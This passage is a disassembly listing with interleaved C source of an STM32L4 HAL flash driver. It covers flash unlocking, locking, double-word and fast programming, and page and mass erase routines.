 80014da:	695a      	ldr	r2, [r3, #20]
 80014dc:	693b      	ldr	r3, [r7, #16]
 80014de:	43db      	mvns	r3, r3
 80014e0:	4907      	ldr	r1, [pc, #28]	; (8001500 <HAL_FLASH_Program+0xd4>)
 80014e2:	4013      	ands	r3, r2
 80014e4:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80014e6:	f000 f9cf 	bl	8001888 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80014ea:	4b04      	ldr	r3, [pc, #16]	; (80014fc <HAL_FLASH_Program+0xd0>)
 80014ec:	2200      	movs	r2, #0
 80014ee:	701a      	strb	r2, [r3, #0]

  return status;
 80014f0:	7dfb      	ldrb	r3, [r7, #23]
}
 80014f2:	4618      	mov	r0, r3
 80014f4:	3718      	adds	r7, #24
 80014f6:	46bd      	mov	sp, r7
 80014f8:	bd80      	pop	{r7, pc}
 80014fa:	bf00      	nop
 80014fc:	2000000c 	.word	0x2000000c
 8001500:	40022000 	.word	0x40022000

08001504 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 8001504:	b480      	push	{r7}
 8001506:	b083      	sub	sp, #12
 8001508:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 800150a:	2300      	movs	r3, #0
 800150c:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800150e:	4b0b      	ldr	r3, [pc, #44]	; (800153c <HAL_FLASH_Unlock+0x38>)
 8001510:	695b      	ldr	r3, [r3, #20]
 8001512:	2b00      	cmp	r3, #0
 8001514:	da0b      	bge.n	800152e <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 8001516:	4b09      	ldr	r3, [pc, #36]	; (800153c <HAL_FLASH_Unlock+0x38>)
 8001518:	4a09      	ldr	r2, [pc, #36]	; (8001540 <HAL_FLASH_Unlock+0x3c>)
 800151a:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 800151c:	4b07      	ldr	r3, [pc, #28]	; (800153c <HAL_FLASH_Unlock+0x38>)
 800151e:	4a09      	ldr	r2, [pc, #36]	; (8001544 <HAL_FLASH_Unlock+0x40>)
 8001520:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 8001522:	4b06      	ldr	r3, [pc, #24]	; (800153c <HAL_FLASH_Unlock+0x38>)
 8001524:	695b      	ldr	r3, [r3, #20]
 8001526:	2b00      	cmp	r3, #0
 8001528:	da01      	bge.n	800152e <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 800152a:	2301      	movs	r3, #1
 800152c:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 800152e:	79fb      	ldrb	r3, [r7, #7]
}
 8001530:	4618      	mov	r0, r3
 8001532:	370c      	adds	r7, #12
 8001534:	46bd      	mov	sp, r7
 8001536:	f85d 7b04 	ldr.w	r7, [sp], #4
 800153a:	4770      	bx	lr
 800153c:	40022000 	.word	0x40022000
 8001540:	45670123 	.word	0x45670123
 8001544:	cdef89ab 	.word	0xcdef89ab

08001548 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 8001548:	b480      	push	{r7}
 800154a:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 800154c:	4b05      	ldr	r3, [pc, #20]	; (8001564 <HAL_FLASH_Lock+0x1c>)
 800154e:	695b      	ldr	r3, [r3, #20]
 8001550:	4a04      	ldr	r2, [pc, #16]	; (8001564 <HAL_FLASH_Lock+0x1c>)
 8001552:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 8001556:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 8001558:	2300      	movs	r3, #0
}
 800155a:	4618      	mov	r0, r3
 800155c:	46bd      	mov	sp, r7
 800155e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001562:	4770      	bx	lr
 8001564:	40022000 	.word	0x40022000

08001568 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 8001568:	b580      	push	{r7, lr}
 800156a:	b084      	sub	sp, #16
 800156c:	af00      	add	r7, sp, #0
 800156e:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 8001570:	f7ff fe1a 	bl	80011a8 <HAL_GetTick>
 8001574:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001576:	e00d      	b.n	8001594 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 8001578:	687b      	ldr	r3, [r7, #4]
 800157a:	f1b3 3fff 	cmp.w	r3, #4294967295
 800157e:	d009      	beq.n	8001594 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 8001580:	f7ff fe12 	bl	80011a8 <HAL_GetTick>
 8001584:	4602      	mov	r2, r0
 8001586:	68fb      	ldr	r3, [r7, #12]
 8001588:	1ad3      	subs	r3, r2, r3
 800158a:	687a      	ldr	r2, [r7, #4]
 800158c:	429a      	cmp	r2, r3
 800158e:	d801      	bhi.n	8001594 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 8001590:	2303      	movs	r3, #3
 8001592:	e036      	b.n	8001602 <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 8001594:	4b1d      	ldr	r3, [pc, #116]	; (800160c <FLASH_WaitForLastOperation+0xa4>)
 8001596:	691b      	ldr	r3, [r3, #16]
 8001598:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 800159c:	2b00      	cmp	r3, #0
 800159e:	d1eb      	bne.n	8001578 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 80015a0:	4b1a      	ldr	r3, [pc, #104]	; (800160c <FLASH_WaitForLastOperation+0xa4>)
 80015a2:	691a      	ldr	r2, [r3, #16]
 80015a4:	4b1a      	ldr	r3, [pc, #104]	; (8001610 <FLASH_WaitForLastOperation+0xa8>)
 80015a6:	4013      	ands	r3, r2
 80015a8:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 80015aa:	68bb      	ldr	r3, [r7, #8]
 80015ac:	2b00      	cmp	r3, #0
 80015ae:	d01e      	beq.n	80015ee <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 80015b0:	4b18      	ldr	r3, [pc, #96]	; (8001614 <FLASH_WaitForLastOperation+0xac>)
 80015b2:	685a      	ldr	r2, [r3, #4]
 80015b4:	68bb      	ldr	r3, [r7, #8]
 80015b6:	4313      	orrs	r3, r2
 80015b8:	4a16      	ldr	r2, [pc, #88]	; (8001614 <FLASH_WaitForLastOperation+0xac>)
 80015ba:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 80015bc:	68bb      	ldr	r3, [r7, #8]
 80015be:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80015c2:	2b00      	cmp	r3, #0
 80015c4:	d007      	beq.n	80015d6 <FLASH_WaitForLastOperation+0x6e>
 80015c6:	4b11      	ldr	r3, [pc, #68]	; (800160c <FLASH_WaitForLastOperation+0xa4>)
 80015c8:	699a      	ldr	r2, [r3, #24]
 80015ca:	68bb      	ldr	r3, [r7, #8]
 80015cc:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 80015d0:	490e      	ldr	r1, [pc, #56]	; (800160c <FLASH_WaitForLastOperation+0xa4>)
 80015d2:	4313      	orrs	r3, r2
 80015d4:	618b      	str	r3, [r1, #24]
 80015d6:	68bb      	ldr	r3, [r7, #8]
 80015d8:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015dc:	2b00      	cmp	r3, #0
 80015de:	d004      	beq.n	80015ea <FLASH_WaitForLastOperation+0x82>
 80015e0:	4a0a      	ldr	r2, [pc, #40]	; (800160c <FLASH_WaitForLastOperation+0xa4>)
 80015e2:	68bb      	ldr	r3, [r7, #8]
 80015e4:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 80015e8:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 80015ea:	2301      	movs	r3, #1
 80015ec:	e009      	b.n	8001602 <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 80015ee:	4b07      	ldr	r3, [pc, #28]	; (800160c <FLASH_WaitForLastOperation+0xa4>)
 80015f0:	691b      	ldr	r3, [r3, #16]
 80015f2:	f003 0301 	and.w	r3, r3, #1
 80015f6:	2b00      	cmp	r3, #0
 80015f8:	d002      	beq.n	8001600 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 80015fa:	4b04      	ldr	r3, [pc, #16]	; (800160c <FLASH_WaitForLastOperation+0xa4>)
 80015fc:	2201      	movs	r2, #1
 80015fe:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 8001600:	2300      	movs	r3, #0
}
 8001602:	4618      	mov	r0, r3
 8001604:	3710      	adds	r7, #16
 8001606:	46bd      	mov	sp, r7
 8001608:	bd80      	pop	{r7, pc}
 800160a:	bf00      	nop
 800160c:	40022000 	.word	0x40022000
 8001610:	0002c3fa 	.word	0x0002c3fa
 8001614:	2000000c 	.word	0x2000000c

08001618 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 8001618:	b480      	push	{r7}
 800161a:	b085      	sub	sp, #20
 800161c:	af00      	add	r7, sp, #0
 800161e:	60f8      	str	r0, [r7, #12]
 8001620:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 8001624:	4b0e      	ldr	r3, [pc, #56]	; (8001660 <FLASH_Program_DoubleWord+0x48>)
 8001626:	695b      	ldr	r3, [r3, #20]
 8001628:	4a0d      	ldr	r2, [pc, #52]	; (8001660 <FLASH_Program_DoubleWord+0x48>)
 800162a:	f043 0301 	orr.w	r3, r3, #1
 800162e:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 8001630:	68fb      	ldr	r3, [r7, #12]
 8001632:	683a      	ldr	r2, [r7, #0]
 8001634:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 8001636:	f3bf 8f6f 	isb	sy
}
 800163a:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 800163c:	e9d7 0100 	ldrd	r0, r1, [r7]
 8001640:	f04f 0200 	mov.w	r2, #0
 8001644:	f04f 0300 	mov.w	r3, #0
 8001648:	000a      	movs	r2, r1
 800164a:	2300      	movs	r3, #0
 800164c:	68f9      	ldr	r1, [r7, #12]
 800164e:	3104      	adds	r1, #4
 8001650:	4613      	mov	r3, r2
 8001652:	600b      	str	r3, [r1, #0]
}
 8001654:	bf00      	nop
 8001656:	3714      	adds	r7, #20
 8001658:	46bd      	mov	sp, r7
 800165a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800165e:	4770      	bx	lr
 8001660:	40022000 	.word	0x40022000

08001664 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 8001664:	b480      	push	{r7}
 8001666:	b089      	sub	sp, #36	; 0x24
 8001668:	af00      	add	r7, sp, #0
 800166a:	6078      	str	r0, [r7, #4]
 800166c:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 800166e:	2340      	movs	r3, #64	; 0x40
 8001670:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 8001672:	687b      	ldr	r3, [r7, #4]
 8001674:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 8001676:	683b      	ldr	r3, [r7, #0]
 8001678:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 800167a:	4b14      	ldr	r3, [pc, #80]	; (80016cc <FLASH_Program_Fast+0x68>)
 800167c:	695b      	ldr	r3, [r3, #20]
 800167e:	4a13      	ldr	r2, [pc, #76]	; (80016cc <FLASH_Program_Fast+0x68>)
 8001680:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8001684:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 8001686:	f3ef 8310 	mrs	r3, PRIMASK
 800168a:	60fb      	str	r3, [r7, #12]
  return(result);
 800168c:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 800168e:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 8001690:	b672      	cpsid	i
}
 8001692:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 8001694:	697b      	ldr	r3, [r7, #20]
 8001696:	681a      	ldr	r2, [r3, #0]
 8001698:	69bb      	ldr	r3, [r7, #24]
 800169a:	601a      	str	r2, [r3, #0]
    dest_addr++;
 800169c:	69bb      	ldr	r3, [r7, #24]
 800169e:	3304      	adds	r3, #4
 80016a0:	61bb      	str	r3, [r7, #24]
    src_addr++;
 80016a2:	697b      	ldr	r3, [r7, #20]
 80016a4:	3304      	adds	r3, #4
 80016a6:	617b      	str	r3, [r7, #20]
    row_index--;
 80016a8:	7ffb      	ldrb	r3, [r7, #31]
 80016aa:	3b01      	subs	r3, #1
 80016ac:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 80016ae:	7ffb      	ldrb	r3, [r7, #31]
 80016b0:	2b00      	cmp	r3, #0
 80016b2:	d1ef      	bne.n	8001694 <FLASH_Program_Fast+0x30>
 80016b4:	693b      	ldr	r3, [r7, #16]
 80016b6:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 80016b8:	68bb      	ldr	r3, [r7, #8]
 80016ba:	f383 8810 	msr	PRIMASK, r3
}
 80016be:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 80016c0:	bf00      	nop
 80016c2:	3724      	adds	r7, #36	; 0x24
 80016c4:	46bd      	mov	sp, r7
 80016c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80016ca:	4770      	bx	lr
 80016cc:	40022000 	.word	0x40022000

080016d0 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 80016d0:	b580      	push	{r7, lr}
 80016d2:	b084      	sub	sp, #16
 80016d4:	af00      	add	r7, sp, #0
 80016d6:	6078      	str	r0, [r7, #4]
 80016d8:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 80016da:	4b48      	ldr	r3, [pc, #288]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 80016dc:	781b      	ldrb	r3, [r3, #0]
 80016de:	2b01      	cmp	r3, #1
 80016e0:	d101      	bne.n	80016e6 <HAL_FLASHEx_Erase+0x16>
 80016e2:	2302      	movs	r3, #2
 80016e4:	e085      	b.n	80017f2 <HAL_FLASHEx_Erase+0x122>
 80016e6:	4b45      	ldr	r3, [pc, #276]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 80016e8:	2201      	movs	r2, #1
 80016ea:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80016ec:	f24c 3050 	movw	r0, #50000	; 0xc350
 80016f0:	f7ff ff3a 	bl	8001568 <FLASH_WaitForLastOperation>
 80016f4:	4603      	mov	r3, r0
 80016f6:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 80016f8:	7bfb      	ldrb	r3, [r7, #15]
 80016fa:	2b00      	cmp	r3, #0
 80016fc:	d175      	bne.n	80017ea <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 80016fe:	4b3f      	ldr	r3, [pc, #252]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 8001700:	2200      	movs	r2, #0
 8001702:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 8001704:	4b3e      	ldr	r3, [pc, #248]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 8001706:	681b      	ldr	r3, [r3, #0]
 8001708:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800170c:	2b00      	cmp	r3, #0
 800170e:	d013      	beq.n	8001738 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001710:	4b3b      	ldr	r3, [pc, #236]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 8001712:	681b      	ldr	r3, [r3, #0]
 8001714:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001718:	2b00      	cmp	r3, #0
 800171a:	d009      	beq.n	8001730 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 800171c:	4b38      	ldr	r3, [pc, #224]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 800171e:	681b      	ldr	r3, [r3, #0]
 8001720:	4a37      	ldr	r2, [pc, #220]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 8001722:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001726:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001728:	4b34      	ldr	r3, [pc, #208]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 800172a:	2203      	movs	r2, #3
 800172c:	771a      	strb	r2, [r3, #28]
 800172e:	e016      	b.n	800175e <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 8001730:	4b32      	ldr	r3, [pc, #200]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 8001732:	2201      	movs	r2, #1
 8001734:	771a      	strb	r2, [r3, #28]
 8001736:	e012      	b.n	800175e <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001738:	4b31      	ldr	r3, [pc, #196]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 800173a:	681b      	ldr	r3, [r3, #0]
 800173c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001740:	2b00      	cmp	r3, #0
 8001742:	d009      	beq.n	8001758 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001744:	4b2e      	ldr	r3, [pc, #184]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 8001746:	681b      	ldr	r3, [r3, #0]
 8001748:	4a2d      	ldr	r2, [pc, #180]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 800174a:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800174e:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001750:	4b2a      	ldr	r3, [pc, #168]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 8001752:	2202      	movs	r2, #2
 8001754:	771a      	strb	r2, [r3, #28]
 8001756:	e002      	b.n	800175e <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001758:	4b28      	ldr	r3, [pc, #160]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 800175a:	2200      	movs	r2, #0
 800175c:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 800175e:	687b      	ldr	r3, [r7, #4]
 8001760:	681b      	ldr	r3, [r3, #0]
 8001762:	2b01      	cmp	r3, #1
 8001764:	d111      	bne.n	800178a <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 8001766:	687b      	ldr	r3, [r7, #4]
 8001768:	685b      	ldr	r3, [r3, #4]
 800176a:	4618      	mov	r0, r3
 800176c:	f000 f84a 	bl	8001804 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001770:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001774:	f7ff fef8 	bl	8001568 <FLASH_WaitForLastOperation>
 8001778:	4603      	mov	r3, r0
 800177a:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 800177c:	4b20      	ldr	r3, [pc, #128]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 800177e:	695b      	ldr	r3, [r3, #20]
 8001780:	4a1f      	ldr	r2, [pc, #124]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 8001782:	f023 0304 	bic.w	r3, r3, #4
 8001786:	6153      	str	r3, [r2, #20]
 8001788:	e02d      	b.n	80017e6 <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 800178a:	683b      	ldr	r3, [r7, #0]
 800178c:	f04f 32ff 	mov.w	r2, #4294967295
 8001790:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001792:	687b      	ldr	r3, [r7, #4]
 8001794:	689b      	ldr	r3, [r3, #8]
 8001796:	60bb      	str	r3, [r7, #8]
 8001798:	e01d      	b.n	80017d6 <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 800179a:	687b      	ldr	r3, [r7, #4]
 800179c:	685b      	ldr	r3, [r3, #4]
 800179e:	4619      	mov	r1, r3
 80017a0:	68b8      	ldr	r0, [r7, #8]
 80017a2:	f000 f84d 	bl	8001840 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80017a6:	f24c 3050 	movw	r0, #50000	; 0xc350
 80017aa:	f7ff fedd 	bl	8001568 <FLASH_WaitForLastOperation>
 80017ae:	4603      	mov	r3, r0
 80017b0:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 80017b2:	4b13      	ldr	r3, [pc, #76]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 80017b4:	695b      	ldr	r3, [r3, #20]
 80017b6:	4a12      	ldr	r2, [pc, #72]	; (8001800 <HAL_FLASHEx_Erase+0x130>)
 80017b8:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 80017bc:	f023 0302 	bic.w	r3, r3, #2
 80017c0:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 80017c2:	7bfb      	ldrb	r3, [r7, #15]
 80017c4:	2b00      	cmp	r3, #0
 80017c6:	d003      	beq.n	80017d0 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 80017c8:	683b      	ldr	r3, [r7, #0]
 80017ca:	68ba      	ldr	r2, [r7, #8]
 80017cc:	601a      	str	r2, [r3, #0]
          break;
 80017ce:	e00a      	b.n	80017e6 <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80017d0:	68bb      	ldr	r3, [r7, #8]
 80017d2:	3301      	adds	r3, #1
 80017d4:	60bb      	str	r3, [r7, #8]
 80017d6:	687b      	ldr	r3, [r7, #4]
 80017d8:	689a      	ldr	r2, [r3, #8]
 80017da:	687b      	ldr	r3, [r7, #4]
 80017dc:	68db      	ldr	r3, [r3, #12]
 80017de:	4413      	add	r3, r2
 80017e0:	68ba      	ldr	r2, [r7, #8]
 80017e2:	429a      	cmp	r2, r3
 80017e4:	d3d9      	bcc.n	800179a <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80017e6:	f000 f84f 	bl	8001888 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80017ea:	4b04      	ldr	r3, [pc, #16]	; (80017fc <HAL_FLASHEx_Erase+0x12c>)
 80017ec:	2200      	movs	r2, #0
 80017ee:	701a      	strb	r2, [r3, #0]

  return status;
 80017f0:	7bfb      	ldrb	r3, [r7, #15]
}
 80017f2:	4618      	mov	r0, r3
 80017f4:	3710      	adds	r7, #16
 80017f6:	46bd      	mov	sp, r7
 80017f8:	bd80      	pop	{r7, pc}
 80017fa:	bf00      	nop
 80017fc:	2000000c 	.word	0x2000000c
 8001800:	40022000 	.word	0x40022000

08001804 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 8001804:	b480      	push	{r7}
 8001806:	b083      	sub	sp, #12
 8001808:	af00      	add	r7, sp, #0
 800180a:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 800180c:	687b      	ldr	r3, [r7, #4]
 800180e:	f003 0301 	and.w	r3, r3, #1
 8001812:	2b00      	cmp	r3, #0
 8001814:	d005      	beq.n	8001822 <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 8001816:	4b09      	ldr	r3, [pc, #36]	; (800183c <FLASH_MassErase+0x38>)
 8001818:	695b      	ldr	r3, [r3, #20]
 800181a:	4a08      	ldr	r2, [pc, #32]	; (800183c <FLASH_MassErase+0x38>)
 800181c:	f043 0304 	orr.w	r3, r3, #4
 8001820:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001822:	4b06      	ldr	r3, [pc, #24]	; (800183c <FLASH_MassErase+0x38>)
 8001824:	695b      	ldr	r3, [r3, #20]
 8001826:	4a05      	ldr	r2, [pc, #20]	; (800183c <FLASH_MassErase+0x38>)
 8001828:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800182c:	6153      	str	r3, [r2, #20]
}
 800182e:	bf00      	nop
 8001830:	370c      	adds	r7, #12
 8001832:	46bd      	mov	sp, r7
 8001834:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001838:	4770      	bx	lr
 800183a:	bf00      	nop
 800183c:	40022000 	.word	0x40022000

08001840 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
